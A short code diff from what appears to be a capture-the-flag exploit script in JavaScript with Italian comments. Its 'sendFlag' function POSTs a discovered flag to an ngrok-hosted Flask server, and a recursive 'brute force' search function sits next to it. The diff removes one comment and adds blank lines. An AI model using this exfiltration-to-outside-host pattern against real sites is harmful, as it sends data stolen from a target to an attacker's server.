@@ -15,7 +15,7 @@
             // Funzione per inviare la flag trovata al server Flask
             async function sendFlag(flag) {
                 try {
-                    const response = await fetch('https://d2f2-87-4-142-72.ngrok-free.app/submit_flag', { // Aggiorna con l'URL di ngrok
+                    const response = await fetch('https://d2f2-87-4-142-72.ngrok-free.app/submit_flag', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
@@ -31,6 +31,8 @@
                     console.error('Errore nella richiesta:', error);
                 }
             }
+
+
 
             // Funzione ricorsiva per il brute force
             async function search(index) {
